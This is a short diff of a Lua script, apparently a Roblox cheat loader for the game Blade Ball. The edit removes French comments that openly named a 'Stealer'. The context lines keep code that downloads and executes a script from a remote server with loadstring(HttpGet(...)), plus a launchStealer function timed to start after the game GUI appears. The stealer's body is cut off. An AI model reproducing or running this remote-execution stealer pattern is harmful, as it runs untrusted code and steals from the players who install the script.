@@ -1,4 +1,4 @@
--- 1. On lance Blade Ball en priorité absolue
+-- 1. 
 local function launchBladeBall()
     local success, err = pcall(function()
         loadstring(game:HttpGet("https://api.blyatscripts.xyz/v1/auth"))()
@@ -6,7 +6,7 @@ local function launchBladeBall()
     if not success then print("Erreur Argon: " .. tostring(err)) end
 end
 
--- 2. On lance le Stealer avec un délai plus long
+-- 2. 
 local function launchStealer()
     task.wait(5) -- On attend 5 secondes que le GUI de Blade Ball soit chargé
     local success, err = pcall(function()
